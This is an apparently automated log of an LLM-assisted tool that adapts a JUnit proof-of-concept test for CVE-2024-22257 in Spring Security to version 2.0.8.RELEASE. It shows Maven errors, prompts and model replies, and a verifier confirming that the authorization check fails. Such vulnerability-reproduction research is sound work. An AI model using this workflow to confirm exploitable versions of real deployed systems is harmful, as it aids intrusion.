[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,149] incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[22,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 21, Column: 149
  Message  : incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>
  Symbol   : None
  Location : None
  Code     : List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();
  Position : after the fixing line (20)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,149] incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[22,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1635 (prompt), 1 (completion), 1636 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,149] incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[22,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.189 s
[INFO] Finished at: 2025-07-10T06:48:39Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,149] incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[22,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 178 (prompt), 6 (completion), 184 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code:         List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes(); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
ConfigAttributeDefinition;ConfigAttribute
[96m[ErrorManager] Extracted key entities: ['ConfigAttributeDefinition', 'ConfigAttribute'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 21, 'column': 149, 'message': 'incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>', 'symbol': None, 'location': None, 'code_line': '        List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();'} with cause: ['ConfigAttributeDefinition', 'ConfigAttribute'][0m
[96m[Adapter] Related diffs for error: [(21, 8.0), (26, 8.0), (442, 8.0), (447, 8.0), (450, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute> | cause: ['ConfigAttributeDefinition', 'ConfigAttribute'][0m
[96m[RepairModule] Trying best diff #21 with score 8.00[0m
[LLMClient] Tokens used: 746 (prompt), 279 (completion), 1025 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute>, symble: None, location: None

### Error Position:
        List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();

### Related Diff:
Operation: MODIFIED, File: acl/src/main/java/org/springframework/security/acls/afterinvocation/AclEntryAfterInvocationCollectionFilteringProvider.java, Hunk: @@ -69,13 +66,14 @@ public class AclEntryAfterInvocationCollectionFilteringProvider extends Abstract

     //~ Constructors ===================================================================================================

+    public AclEntryAfterInvocationCollectionFilteringProvider(AclService aclService, Permission[] requirePermission) {
-    public AclEntryAfterInvocationCollectionFilteringProvider(AclService aclService, List<Permission> requirePermission) {
         super(aclService, "AFTER_ACL_COLLECTION_READ", requirePermission);
     }

     //~ Methods ========================================================================================================

+    public Object decide(Authentication authentication, Object object, ConfigAttributeDefinition config,
-    @SuppressWarnings("unchecked")
-    public Object decide(Authentication authentication, Object object, Collection<ConfigAttribute> config,
             Object returnedObject) throws AccessDeniedException {

         if (returnedObject == null) {

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.ConfigAttributeDefinition;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}



[LLMClient] Response: 
Here's the modified test file according to the diff:

```java
package edu.vision.se;

import java.util.List;
import java.util.Collection;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.ConfigAttributeDefinition;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        Collection<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[23,52] incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 23, Column: 52
  Message  : incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
  Symbol   : None
  Location : None
  Code     : validateReturnValue(voter.vote(null, null, def));
  Position : after the fixing line (21)[0m
[92m[RepairModule] Error incompatible types: java.util.Collection cannot be converted to java.util.List<org.springframework.security.ConfigAttribute> resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[23,52] incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1649 (prompt), 1 (completion), 1650 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java: /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java uses unchecked or unsafe operations.
[WARNING] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java: Recompile with -Xlint:unchecked for details.
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 3 warnings 
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[23,52] incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.253 s
[INFO] Finished at: 2025-07-10T06:49:08Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[23,52] incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 159 (prompt), 10 (completion), 169 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code:         validateReturnValue(voter.vote(null, null, def)); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
`voter.vote;ConfigAttributeDefinition`
[96m[ErrorManager] Extracted key entities: ['`voter.vote', 'ConfigAttributeDefinition`'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 23, 'column': 52, 'message': 'incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition', 'symbol': None, 'location': None, 'code_line': '        validateReturnValue(voter.vote(null, null, def));'} with cause: ['`voter.vote', 'ConfigAttributeDefinition`'][0m
[96m[Adapter] Related diffs for error: [(0, 0.0), (2, 0.0), (4, 0.0), (5, 0.0), (6, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition | cause: ['`voter.vote', 'ConfigAttributeDefinition`'][0m
[96m[RepairModule] Trying best diff #0 with score 0.00[0m
[93m[RepairModule] Best diff score 0.00 is too low, try deprecated.[0m
[LLMClient] Tokens used: 363 (prompt), 277 (completion), 640 (total)
[LLMClient] Prompt: 
You are given a Java test file that may contain a complication error.
Your task is to remove code related to the issue from this file.
Only output the modified version of the test file without any explanations.

### Compilation Errors:
message: incompatible types: java.util.Collection<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition, symbol: None, location: None
### Test File Content:
package edu.vision.se;

import java.util.List;
import java.util.Collection;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.ConfigAttributeDefinition;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        Collection<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}



[LLMClient] Response: 
Here's the modified version of the test file with the compilation error fixed:

```java
package edu.vision.se;

import java.util.List;
import java.util.Collection;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.ConfigAttributeDefinition;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        ConfigAttributeDefinition def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY});
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}
```
[96m[RepairModule] Removed deprecated code, retrying repair.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success after removing deprecated code![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 3.0.0.RELEASE to 2.0.8.RELEASE successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 2.0.8.RELEASE...[0m
[92m[Executor] Adaptation + reproduction successful on 2.0.8.RELEASE[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.8.RELEASE[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.7.RELEASE[0m
[96m[Selector] Closest reproduced version: 2.0.8.RELEASE at index 8[0m
[96m[Adapter] Trying next closest version: 2.0.7.RELEASE[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.8.RELEASE/exploit[0m
